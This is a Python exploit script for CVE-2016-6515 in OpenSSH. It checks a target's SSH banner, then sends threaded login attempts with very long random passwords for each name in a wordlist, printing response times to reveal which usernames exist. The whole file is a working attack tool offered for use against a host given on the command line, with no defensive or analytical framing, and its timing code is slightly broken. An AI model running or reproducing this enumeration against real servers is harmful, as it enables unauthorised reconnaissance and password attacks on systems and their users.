import argparse
from log_colors import *
import random
import socket
import paramiko
import string
import sys
import threading
import time

class SSHLoginThread(threading.Thread):
    def __init__(self, host, username):
        threading.Thread.__init__(self)
        self.host = host
        self.username = username
        psswd_len = 32 * 1024
        self.password = "".join(random.choice(string.ascii_lowercase) for i in range(psswd_len))
    
    # ssh login
    def run(self):
        print (LogColors.BLUE + "connect by " + self.username + "..." + LogColors.ENDC)
        start = time.perf_counter()
        try:
            # connect via ssh
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.host, 22, username = self.username, password = self.password)
        except Exception as e:
            end = time.perf_counter()
        total = end - start
        print (LogColors.YELLOW + str(self.username) + " total: " + str(total) + LogColors.ENDC)

class CVE2016_6515:
    # set filename with usernames
    def __init__(self, host, fname):
        self.host = host
        self.fname = fname

    # check is openssh server, is vulnerable?
    def is_vulnerable(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((self.host, 22))
            sock.send('WhoAreYou\r\n'.encode("utf-8"))
            result = sock.recv(100).decode("utf-8")
            sock.close()
            print (LogColors.YELLOW + result + LogColors.ENDC)
            if "OpenSSH" in result:
                print (LogColors.GREEN + "host may be vulnerable :)" + LogColors.ENDC)
                return True
            else:
                print (LogColors.RED + "not openssh :(" + LogColors.ENDC)
                return False
        except Exception as e:
            print (LogColors.RED + 'cannot connect to 22 port' + LogColors.ENDC)
            print (LogColors.RED + str(e) + LogColors.ENDC)
        return False
    
    # exploiting (enumerate users)
    def enum_usernames(self):
        with open(fname) as f:
            usernames = [i.strip() for i in f.readlines()]
            threadLock = threading.Lock()
            threads = [SSHLoginThread(self.host, j) for j in usernames]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        print (LogColors.GREEN + "usernames successfully enumerate :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target host with openssh")
    parser.add_argument('-u','--usernames', required = True, help = "ssh usernames file")
    args = vars(parser.parse_args())
    host, fname = args['target'], args['usernames']
    cve = CVE2016_6515(host, fname)
    if cve.is_vulnerable():
        cve.enum_usernames()

